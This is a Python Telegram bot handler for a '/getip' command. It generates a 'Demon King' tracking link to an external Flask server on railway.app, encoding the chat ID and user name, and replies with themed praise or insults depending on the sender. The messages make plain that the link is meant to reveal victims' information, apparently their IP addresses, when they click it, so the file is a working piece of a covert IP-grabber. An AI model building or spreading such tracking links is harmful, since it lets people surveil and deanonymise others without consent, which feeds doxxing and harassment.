from telegram import Update
from telegram.ext import ContextTypes, CommandHandler

# Your Flask server URL
FLASK_SERVER = "https://web-production-5240.up.railway.app"

# Your Telegram ID
KING_ID = 6966542803  # replace with your actual ID


def escape_markdown(text: str) -> str:
    """Escape special characters for MarkdownV2"""
    escape_chars = "_*[]()~`>#+-=|{}.!"
    for char in escape_chars:
        text = text.replace(char, f"\\{char}")
    return text


async def getip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate Demon King tracking link with dynamic message"""
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name or "Mortal"

    # Create the Flask link with chat + user info
    link = f"{FLASK_SERVER}?chat={chat_id}&user={user_name}"

    if user_id == KING_ID:
        # King uses command → worshipful message
        message = (
            f"👑 All hail King {user_name}! 👑\n\n"
            "The mortals and weaklings tremble at your gaze.\n"
            "Through this sacred link, all secrets of the lowly shall be revealed to you.\n\n"
            f"🔗 Your Demon King Link:\n{link}\n\n"
            "☠️ None can oppose you, for your might is absolute."
        )
    else:
        # Mortal uses command → insulting message
        message = (
            f"💀 Mortal {user_name}, weakling of the realm! 💀\n\n"
            "Your feeble attempts to wield the Demon King’s power amuse me.\n"
            "Through this cursed link, you shall peer upon others, yet remain nothing before the King.\n\n"
            f"🔗 Your Pitiful Link:\n{link}\n\n"
            "☠️ Tremble, weakling. Your name is but a whisper to me."
        )

    # Escape MarkdownV2 reserved characters
    safe_message = escape_markdown(message)

    # Send message to the user who summoned the link
    await context.bot.send_message(chat_id=chat_id, text=safe_message, parse_mode="MarkdownV2")

getips = CommandHandler("getip", getip)
